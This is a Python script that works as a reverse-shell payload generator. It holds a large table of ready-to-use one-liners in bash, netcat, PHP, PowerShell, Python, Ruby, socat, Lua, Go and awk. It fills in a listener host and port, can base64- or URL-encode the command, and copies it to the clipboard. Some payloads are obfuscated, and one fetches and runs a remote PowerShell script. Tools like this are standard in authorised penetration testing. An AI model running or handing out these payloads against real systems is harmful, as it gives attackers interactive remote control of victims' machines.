#!/usr/bin/env python3

from base64 import b64encode
from urllib.parse import quote
from psutil import net_if_addrs
from sys import argv
from pyperclip import copy

shells = {
    'bash':{
        'basic':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
        '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; bash <&196 >&196 2>&196 ''',
        'readline':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
        '5':''' bash -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
        'udp':''' bash -i >& /dev/udp/LHOST/LPORT 0>&1 '''
    },
    'sh':{
        'gurgui':''' sh -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
        '196':''' 0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196 ''',
        'read line':''' exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done ''',
        '5':''' sh -i 5<> /dev/tcp/LHOST/LPORT 0<&5 1>&5 2>&5 ''',
        'udp':''' sh -i >& /dev/udp/LHOST/LPORT 0>&1 '''
    },
    'nc':{
        'mkfifo':''' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f ''',
        '-e':''' nc -e sh LHOST LPORT ''',
        'exe':''' nc.exe -e sh LHOST LPORT ''',
        '-c':''' nc -c sh LHOST LPORT ''',
    },
    'ncat':{
        '-e':''' ncat LHOST LPORT -e sh ''',
        'exe':''' ncat.exe LHOST LPORT -e sh ''',
        'udp':''' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u LHOST LPORT >/tmp/f '''
    },
    'rustcat':{
        '-r':''' rcat LHOST LPORT -r sh '''
    },
    'perl':{
        '-e':''' perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};' ''',
        'no_sh':''' perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' '''
    },
    'php':{
        'emoji':''' php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "localhost";$ð» = LPORT;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);' ''',
        'exec':''' php -r '$sock=fsockopen("LHOST",LPORT);exec("sh <&3 >&3 2>&3");' ''',
        'shell_exec':''' php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("sh <&3 >&3 2>&3");' ''',
        'system':''' php -r '$sock=fsockopen("LHOST",LPORT);system("sh <&3 >&3 2>&3");' ''',
        'passthru': ''' php -r '$sock=fsockopen("LHOST",LPORT);passthru("sh <&3 >&3 2>&3");' ''',
        'idk':''' php -r '$sock=fsockopen("LHOST",LPORT);`sh <&3 >&3 2>&3`;' ''',
        'popen':''' php -r '$sock=fsockopen("LHOST",LPORT);popen("sh <&3 >&3 2>&3", "r");' ''',
        'proc_open':''' php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' '''
    },
    'windows':{
        'conpty':''' IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST LPORT '''
    },
    'powershell':{
        '1':''' powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() ''',
        '2':''' powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ''',
        '3':''' powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('LHOST', LPORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" '''
    },
    'python':{
        '1':''' export RHOST="LHOST";export RPORT=LPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',
        '2':''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
        '3':''' export RHOST="LHOST";export RPORT=LPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',
        '4':''' python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' ''',
        'short':''' python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' ''',
        'system-nc':''' python3 -c 'import os; os.system("nc -e /bin/sh LHOST LPORT")' '''
    },
    'ruby':{
        '1':''' ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("LHOST",LPORT))' ''',
        'no sh':''' ruby -rsocket -e'exit if fork;c=TCPSocket.new("LHOST","LPORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}' '''
    },
    'socat':{
        'basic':''' socat TCP:LHOST:LPORT EXEC:sh ''',
        'tty':''' socat TCP:LHOST:LPORT EXEC:'sh',pty,stderr,setsid,sigint,sane '''
    },
    'nodejs':{
        'require':''' require('child_process').exec('nc -e sh LHOST LPORT') '''
    },
    'telnet':{
        'basic':''' TF=$(mktemp -u);mkfifo $TF && telnet LHOST LPORT 0<$TF | sh 1>$TF '''
    },
    'zsh':{
        'basic': ''' zsh -c 'zmodload zsh/net/tcp && ztcp LHOST LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' '''
    },
    'lua':{
        '1':''' lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('sh -i <&3 >&3 2>&3');" ''',
        '2':''' lua5.1 -e 'local host, port = "LHOST", LPORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' '''
    },
    'golang':{
        '1':''' echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","LHOST:LPORT");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go '''
    },
    'awk':{
        '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
    }
}
##
available_shells = " ".join([x.upper() for x in shells.keys()])
result = ""

# ENCODING FUNCTIONS
urlenc = lambda url : quote(url,safe='')
b64enc = lambda str : b64encode(str.encode()).decode()


def usage():
    print(f"\n{'':=<10}{''' USAGE '''}{'':=>10}\n")
    print(f"{argv[0]} <shell-type> <options>\n")
    print(f"{argv[0]} <informative-option>")
    print(f"\n{'':=<10}{''' OPTIONS '''}{'':=>10}\n")
    print(" "*3+f"{'':-<5}{''' informative '''}{'':->5}\n")
    print("-h / --help - Displays this message and exit")
    print("-list / --list <shell-type> - Lists different commands available for given shell type")
    print("-listall / --listall - Lists every shell type and command available")
    print("\n"+" "*6+f"{'':-<5}{''' shell '''}{'':->5}\n")
    print("-lp / --lport <lport> - Listening port, default 4444")
    print("-lh / --lhost <lhost> - Listening host, IpAddr(X.X.X.X) or Iface(E.g eth0), default localhost")
    print("\n"+" "*5+f"{'':-<5}{''' encoding '''}{'':->5}\n")
    print("b64  - B64 encodes resulting command")
    print("url  - Url encodes resulting command")

def printShellInfo():
    print(f"\n[+] Shell created [+]\n")
    copy(result)
    print(f"+ Type: {shellt}\n+ Name: {shelln}\n+ Command: {result}\n\n- Copied to clipboard")
    
def checkShellType(shell):
    try:
        shells[shell]
        return 1
    except:
        print(f"[!] - Shell type {shell} doesn't exist")
        return 0

def checkShellName(type,name):
    try:
        shells[type][name]
        return 1
    except:
        print(f"[!] - Shell name {name} doesn't exist in {type} rshells")
        return 0
        
def craftShell(sh,lh,lp,b64,url):
    global result
    result = sh.replace("LHOST",lh).replace("LPORT",lp).strip()
    if b64:
        result = b64enc(result)
    if url:
        result = urlenc(result)
    printShellInfo()
    
def guidedCraft(sht,lh,lp,b64,url):
    global result,shelln
    n = 1
    lh = lh
    for opt in shells[sht]:
        print(n, "=>", shells[sht][opt])
        n+=1
    choice = int(input("Choice: "))
    n = 0
    for i in shells[sht]:
        if n == choice-1:
            shelln = i
            result = shells[sht][i].replace("LHOST",lh).replace("LPORT",lp).strip()
            if b64:
                result = b64enc(result)
            if url:
                result = urlenc(result)
        n+=1
    printShellInfo()    
        
#
if len(argv) == 1:
    usage()
    exit(0)
    
# Check if user is listing or asking for help
shell = argv[1].lower()

if shell == "-h" or shell == "--help":
    usage()
    exit(0)
elif shell == "--listall" or shell == "-listall":
    for x in shells:
        print(f"=========== {x.upper()} ==========\n")
        for i in shells[x]:
            print(f"{i} - {shells[x][i]}\n")
    exit(0)
elif shell == "--list" or shell == "-list":
    shell = 'nc' if shell == 'netcat' else shell    
    try:
        listsh = argv[2].lower()
    except IndexError:
        print("[!] - Type of shell has to be given => ./reverse --list bash")
        print(f"\n[+] - Available shell types:\n{available_shells}")
        exit(0)
        
    if checkShellType(listsh):
        print(f"[!] - Printing {listsh} options\n")
        for i in shells[listsh]:
            print(f"[*] {i} - {shells[listsh][i]}\n")
    exit(0)
        
# Let's craft a reverse shell :)
shellt = shell
shelln = ""

if "=" in shell:
    shellt = shell.split("=")[0]
    shelln = shell.split("=")[1].lower()

if not checkShellType(shellt):
    exit(0)
    
if shelln and not checkShellName(shellt,shelln):
    exit(0)
    
# At this point, we got a valid shell type and name. Parse info and create the shell
lport = "4444"
lhost = "localhost"
b64 = 0
url = 0

for i in range(len(argv)):
    arg = argv[i]
    if arg == "-lp" or arg == "--lport":
        lport = argv[i+1]
    elif arg == "-lh" or arg == "--lhost":
        try:
            lhost = net_if_addrs()["eth0"][0].address
        except:
            lhost = argv[i+1]
    elif arg == "b64":
        if url:
            print("[!] - Cannot mix b64-url encode")
            exit(0)
        b64 = 1
    elif arg == "url":
        if b64:
            print("[!] - Cannot mix b64-url encode")
            exit(0)
        url = 1

if shelln:
    craftShell(shells[shellt][shelln],lhost,lport,b64,url)
else:
    guidedCraft(shellt,lhost,lport,b64,url)